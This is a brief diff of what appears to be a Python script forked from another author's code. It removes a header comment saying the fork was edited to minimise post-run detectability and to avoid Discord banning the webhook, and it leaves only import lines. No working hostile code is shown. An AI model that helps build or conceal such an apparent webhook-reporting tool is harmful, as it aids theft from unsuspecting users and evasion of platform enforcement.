@@ -1,9 +1,3 @@
-# THE ORIGINAL CREATOR AND OWNER OF THIS CODE IS AstraaDev (https://github.com/AstraaDev/)
-# this is a fork of the code edited by lilgatito for:
-#   as little post-run detectability as possible
-#   as little possibility of discord banning your ass after seeing the webhook
-#   removing of unnescassery parts and simplifying code
-
 import os, sys, json, base64, urllib.request, re, ctypes
 from datetime import datetime
 from pathlib import Path
